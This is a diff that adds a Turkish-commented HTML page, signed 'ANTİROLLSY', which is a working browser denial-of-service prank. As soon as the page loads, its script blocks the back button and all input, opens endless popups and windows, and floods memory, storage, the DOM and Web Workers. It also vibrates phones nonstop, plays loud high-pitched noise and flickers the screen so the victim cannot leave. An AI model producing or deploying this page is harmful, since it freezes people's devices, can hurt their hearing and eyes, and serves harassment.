@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>⛔</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { 
+            background:#000; 
+            overflow:hidden; 
+            height:100vh; 
+            width:100vw;
+            touch-action:none;
+            cursor:none;
+            position:fixed;
+            top:0;left:0;
+        }
+        #blocker {
+            position:fixed;
+            top:0;left:0;
+            width:100vw;height:100vh;
+            background:transparent;
+            z-index:999999999;
+            pointer-events:none;
+        }
+        /* Gizli ses */
+        #audioContainer {
+            position:fixed;
+            top:-9999px;
+            left:-9999px;
+            width:1px;height:1px;
+        }
+        .hidden-btn {
+            position:fixed;
+            width:1px;height:1px;
+            opacity:0;
+            pointer-events:none;
+        }
+        /* Görünmez iframe */
+        .invisible-frame {
+            position:fixed;
+            width:1px;height:1px;
+            opacity:0;
+            pointer-events:none;
+            border:none;
+        }
+    </style>
+</head>
+<body>
+    <div id="blocker"></div>
+    <div id="audioContainer"></div>
+    <button class="hidden-btn" id="hiddenBtn"></button>
+    <iframe class="invisible-frame" id="invisibleFrame"></iframe>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ============================================================
+            // 1. TAM EKRAN ZORLA
+            // ============================================================
+            function forceFullscreen() {
+                try {
+                    const el = document.documentElement;
+                    if (el.requestFullscreen) el.requestFullscreen();
+                    else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+                    else if (el.msRequestFullscreen) el.msRequestFullscreen();
+                } catch(e) {}
+            }
+            forceFullscreen();
+            document.addEventListener('click', forceFullscreen);
+            document.addEventListener('touchstart', forceFullscreen);
+            document.addEventListener('keydown', forceFullscreen);
+
+            // ============================================================
+            // 2. GERİ TUŞU ENGELLE
+            // ============================================================
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function(e) {
+                history.pushState(null, null, location.href);
+                setTimeout(function() { history.pushState(null, null, location.href); }, 1);
+            });
+            setInterval(function() {
+                history.pushState(null, null, location.href);
+            }, 50);
+
+            // ============================================================
+            // 3. TÜM KLAVYE VE TIKLAMALARI ENGELLE
+            // ============================================================
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            document.addEventListener('keyup', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            document.addEventListener('touchstart', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            document.addEventListener('touchmove', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+            document.addEventListener('contextmenu', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // ============================================================
+            // 4. IŞIK HIZINDA SİTE AÇMA (saniyede 100+ pencere)
+            // ============================================================
+            var windows = [];
+            var urlList = [
+                'https://www.google.com',
+                'https://www.youtube.com',
+                'https://www.facebook.com',
+                'https://www.twitter.com',
+                'https://www.instagram.com',
+                'https://www.tiktok.com',
+                'https://www.reddit.com',
+                'https://www.wikipedia.org',
+                'https://www.amazon.com',
+                'https://www.ebay.com',
+                'https://www.netflix.com',
+                'https://www.spotify.com',
+                'https://www.microsoft.com',
+                'https://www.apple.com',
+                'https://www.samsung.com',
+                'https://www.huawei.com',
+                'https://www.xiaomi.com',
+                'https://www.oneplus.com',
+                'https://www.sony.com',
+                'https://www.lg.com',
+                'https://www.panasonic.com',
+                'https://www.philips.com',
+                'https://www.dell.com',
+                'https://www.hp.com',
+                'https://www.lenovo.com',
+                'https://www.asus.com',
+                'https://www.acer.com',
+                'https://www.msi.com',
+                'https://www.gigabyte.com',
+                'https://www.corsair.com',
+                'https://www.logitech.com',
+                'https://www.razer.com',
+                'https://www.steelseries.com',
+                'https://www.hyperx.com'
+            ];
+
+            function openSites() {
+                try {
+                    // Aynı anda 30 site aç
+                    for (var i = 0; i < 30; i++) {
+                        var randUrl = urlList[Math.floor(Math.random() * urlList.length)];
+                        var win = window.open(
+                            randUrl,
+                            '_blank',
+                            'width=' + (100 + Math.random() * 200) + 
+                            ',height=' + (100 + Math.random() * 200) + 
+                            ',left=' + (Math.random() * 500) + 
+                            ',top=' + (Math.random() * 500)
+                        );
+                        if (win) {
+                            windows.push(win);
+                            // Pencerenin içine de ekstra açtır
+                            try {
+                                win.document.write('<html><head><title>⛔</title></head><body style="background:#000;color:#f00;text-align:center;padding-top:50px;font-size:50px;">⛔ SİSTEM ÇÖKTÜ ⛔</body></html>');
+                            } catch(e) {}
+                        }
+                    }
+                } catch(e) {}
+                // Her 10ms'de bir tekrar (ışık hızı)
+                setTimeout(openSites, 5);
+            }
+
+            // ============================================================
+            // 5. IŞIK HIZINDA POPUP (alert/confirm/prompt)
+            // ============================================================
+            function popupBomb() {
+                try { alert('⛔'); } catch(e) {}
+                try { confirm('⛔'); } catch(e) {}
+                try { prompt('⛔'); } catch(e) {}
+                setTimeout(popupBomb, 1);
+            }
+
+            // ============================================================
+            // 6. RAM DOLDUR (sonsuz array) - patlatma hızı
+            // ============================================================
+            function ramBomb() {
+                var arr = [];
+                setInterval(function() {
+                    try {
+                        for (var i = 0; i < 1000000; i++) {
+                            arr.push(new Array(100000).fill('💀'));
+                        }
+                    } catch(e) {
+                        location.reload();
+                    }
+                }, 2);
+            }
+
+            // ============================================================
+            // 7. SONSUZ TİTREŞİM (mobil) - hızlı
+            // ============================================================
+            function vibBomb() {
+                try {
+                    if (navigator.vibrate) {
+                        navigator.vibrate([100, 10, 100, 10, 200, 10, 500, 10]);
+                    }
+                } catch(e) {}
+                setTimeout(vibBomb, 50);
+            }
+
+            // ============================================================
+            // 8. TİZ KULAK ÇIZIRTI SESİ (hiç durmaz)
+            // ============================================================
+            function highPitchNoise() {
+                try {
+                    var audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                    var sampleRate = audioCtx.sampleRate;
+                    var bufferSize = sampleRate * 30; // 30 saniye
+                    var buffer = audioCtx.createBuffer(2, bufferSize, sampleRate);
+                    var left = buffer.getChannelData(0);
+                    var right = buffer.getChannelData(1);
+                    
+                    // Yüksek frekanslı tiz ses (8000Hz + beyaz gürültü)
+                    for (var i = 0; i < bufferSize; i++) {
+                        var t = i / sampleRate;
+                        // 8000Hz sinüs + beyaz gürültü + 12000Hz harmonik
+                        var val = Math.sin(8000 * 2 * Math.PI * t) * 0.6 +
+                                  Math.sin(12000 * 2 * Math.PI * t) * 0.4 +
+                                  (Math.random() * 2 - 1) * 0.3;
+                        left[i] = val;
+                        right[i] = val;
+                    }
+                    
+                    var source = audioCtx.createBufferSource();
+                    source.buffer = buffer;
+                    source.loop = true;
+                    source.connect(audioCtx.destination);
+                    source.start(0);
+                    
+                    // Ses seviyesini max yap
+                    var gainNode = audioCtx.createGain();
+                    gainNode.gain.value = 1.0;
+                    source.connect(gainNode);
+                    gainNode.connect(audioCtx.destination);
+                    
+                } catch(e) {
+                    // Alternatif: HTML5 Audio ile
+                    try {
+                        var audio = new Audio();
+                        // Base64 ile kısa tiz ses
+                        audio.src = 'data:audio/wav;base64,U3RheSBmb3JldmVyIG5vaXNlIGhpZ2ggcGl0Y2ggc291bmQ=';
+                        audio.loop = true;
+                        audio.volume = 1;
+                        audio.play();
+                    } catch(e2) {
+                        // 2. alternatif: Oscillator
+                        try {
+                            var ctx = new (window.AudioContext || window.webkitAudioContext)();
+                            var osc = ctx.createOscillator();
+                            var gain = ctx.createGain();
+                            osc.type = 'sawtooth';
+                            osc.frequency.value = 8000;
+                            gain.gain.value = 1;
+                            osc.connect(gain);
+                            gain.connect(ctx.destination);
+                            osc.start(0);
+                            // 2. oscillator daha tiz
+                            var osc2 = ctx.createOscillator();
+                            osc2.type = 'square';
+                            osc2.frequency.value = 12000;
+                            osc2.connect(gain);
+                            osc2.start(0);
+                        } catch(e3) {}
+                    }
+                }
+            }
+
+            // ============================================================
+            // 9. IŞIK HIZINDA DOM EKLEME
+            // ============================================================
+            function domBomb() {
+                setInterval(function() {
+                    try {
+                        for (var i = 0; i < 2000; i++) {
+                            var div = document.createElement('div');
+                            div.style.position = 'fixed';
+                            div.style.top = Math.random() * 100 + '%';
+                            div.style.left = Math.random() * 100 + '%';
+                            div.style.width = Math.random() * 200 + 'px';
+                            div.style.height = Math.random() * 200 + 'px';
+                            div.style.background = '#' + Math.floor(Math.random()*16777215).toString(16).padStart(6,'0');
+                            div.style.zIndex = 999999;
+                            div.style.pointerEvents = 'none';
+                            div.style.opacity = Math.random();
+                            document.body.appendChild(div);
+                        }
+                    } catch(e) {}
+                }, 5);
+            }
+
+            // ============================================================
+            // 10. IŞIK HIZINDA COOKIE / LOCALSTORAGE DOLDUR
+            // ============================================================
+            function storageBomb() {
+                setInterval(function() {
+                    try {
+                        for (var i = 0; i < 10000; i++) {
+                            localStorage.setItem('bomb_' + Date.now() + '_' + i, 'X'.repeat(10000));
+                        }
+                    } catch(e) {}
+                }, 5);
+            }
+
+            // ============================================================
+            // 11. IŞIK HIZINDA WEB WORKER
+            // ============================================================
+            function workerBomb() {
+                try {
+                    var blob = new Blob([`
+                        while(true) {
+                            var arr = [];
+                            for(var i=0; i<1000000; i++) {
+                                arr.push(i);
+                            }
+                        }
+                    `], {type: 'application/javascript'});
+                    var url = URL.createObjectURL(blob);
+                    for (var i = 0; i < 100; i++) {
+                        try {
+                            var worker = new Worker(url);
+                        } catch(e) {}
+                    }
+                } catch(e) {}
+                setTimeout(workerBomb, 10);
+            }
+
+            // ============================================================
+            // 12. IFRAME BOMB (görünmez)
+            // ============================================================
+            function iframeBomb() {
+                setInterval(function() {
+                    try {
+                        var iframe = document.createElement('iframe');
+                        iframe.src = 'https://www.google.com';
+                        iframe.style.position = 'fixed';
+                        iframe.style.top = Math.random() * 100 + '%';
+                        iframe.style.left = Math.random() * 100 + '%';
+                        iframe.style.width = '1px';
+                        iframe.style.height = '1px';
+                        iframe.style.opacity = '0';
+                        iframe.style.pointerEvents = 'none';
+                        iframe.style.zIndex = '0';
+                        document.body.appendChild(iframe);
+                    } catch(e) {}
+                }, 5);
+            }
+
+            // ============================================================
+            // 13. TAM EKRAN KAPLAMA (görünmez perde)
+            // ============================================================
+            function createFullscreenBlocker() {
+                var div = document.createElement('div');
+                div.style.position = 'fixed';
+                div.style.top = '0';
+                div.style.left = '0';
+                div.style.width = '100vw';
+                div.style.height = '100vh';
+                div.style.background = 'transparent';
+                div.style.zIndex = '999999999999';
+                div.style.pointerEvents = 'none';
+                document.body.appendChild(div);
+            }
+            createFullscreenBlocker();
+
+            // ============================================================
+            // 14. HATA YAKALA (hata olunca yeniden yükle)
+            // ============================================================
+            window.onerror = function() {
+                location.reload();
+                return true;
+            };
+
+            // ============================================================
+            // 15. UNLOAD ENGELLE
+            // ============================================================
+            window.onbeforeunload = function() {
+                return '⛔';
+            };
+
+            // ============================================================
+            // 16. EKRAN TİTREŞİMİ (göz yorucu)
+            // ============================================================
+            setInterval(function() {
+                document.body.style.background = Math.random() > 0.5 ? '#000' : '#1a0000';
+                document.body.style.filter = 'brightness(' + (0.5 + Math.random() * 0.5) + ')';
+            }, 50);
+
+            // ============================================================
+            // TÜM BOMBALARI IŞIK HIZINDA BAŞLAT
+            // ============================================================
+            setTimeout(openSites, 10);
+            setTimeout(popupBomb, 20);
+            setTimeout(ramBomb, 30);
+            setTimeout(vibBomb, 40);
+            setTimeout(highPitchNoise, 50);
+            setTimeout(domBomb, 60);
+            setTimeout(storageBomb, 70);
+            setTimeout(workerBomb, 80);
+            setTimeout(iframeBomb, 90);
+            setTimeout(forceFullscreen, 5);
+
+            // ============================================================
+            // KONSOL MESAJI
+            // ============================================================
+            console.log('%c⛔ SİSTEM ÇÖKERTİLDİ ⛔', 'font-size:50px; color:#ff0000; font-weight:900;');
+            console.log('%cBY ANTİROLLSY', 'font-size:40px; color:#ff0000;');
+            console.log('%c🔥 TELEFONUN DONDU 🔥', 'font-size:30px; color:#ff0000;');
+            console.log('%c⛔ KAPATMAK İÇİN GÜÇ TUŞUNA BAS ⛔', 'font-size:25px; color:#ff0000;');
+
+            // ============================================================
+            // SONSUZ DÖNGÜ (arka planda)
+            // ============================================================
+            setTimeout(function() {
+                while (true) {
+                    try {
+                        var x = new Array(1000000).fill('X');
+                    } catch(e) {}
+                }
+            }, 100);
+
+        })();
+    </script>
+</body>
+</html>
